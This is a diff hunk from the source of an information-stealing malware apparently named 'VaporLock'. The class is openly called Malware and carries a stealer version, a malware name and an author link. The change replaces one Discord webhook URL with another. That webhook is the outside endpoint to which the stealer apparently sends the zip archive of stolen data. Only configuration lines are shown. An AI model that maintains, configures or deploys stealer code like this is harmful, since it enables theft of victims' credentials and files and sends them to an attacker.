@@ -24,7 +24,7 @@ class Paths:
 class Malware:
     def __init__(self):
         self.zip_name = f"VL_{random.randint(10000000000, 99999999999)}.zip"
-        self.webhook_url = "https://discord.com/api/webhooks/1511452358545113289/C4PrCAYJXeQueHbCj-dz2nzIlhtoK2A0xznTXxJ1-B5qGWvD-p8raksaBDb8EMtJehsz"
+        self.webhook_url = "https://discord.com/api/webhooks/1511991915837653073/EF6XRpVKlGvYdNHbXfdnQWqkXJSnNfSFMBxSYOLpRL1CDfQi0IVTqzsD_W8FfRfou6yx"
         self.stealer_version = "0.0.0"
         self.malware_name = "VaporLock"
         self.malware_author = "https://guns.lol/croxlv"
